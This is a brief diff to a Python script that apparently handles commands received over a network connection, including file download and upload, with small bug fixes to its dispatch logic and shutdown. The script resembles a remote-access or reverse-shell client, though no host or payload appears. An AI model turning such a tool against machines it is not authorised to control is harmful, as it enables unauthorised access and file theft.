@@ -64,7 +64,7 @@ try:
             elif cmd1[0] == "download" and cmd1[1]:
                 cmd_out = down_func(cmd1[1])
 
-            if cmd1[0] == "upload":
+            elif cmd1[0] == "upload" and cmd1[1] and cmd1[2]:
                 cmd_out = upload(cmd1[1], cmd1[2])
 
             else:
@@ -74,6 +74,7 @@ try:
 
         except Exception:
             cmd_out = "Invalid command!"
+            
         send_j(cmd_out)
 
     connection.close()
@@ -81,5 +82,6 @@ try:
 
 except KeyboardInterrupt:
     print("Exiting..")
+    connection.close()
     exit(0)
 
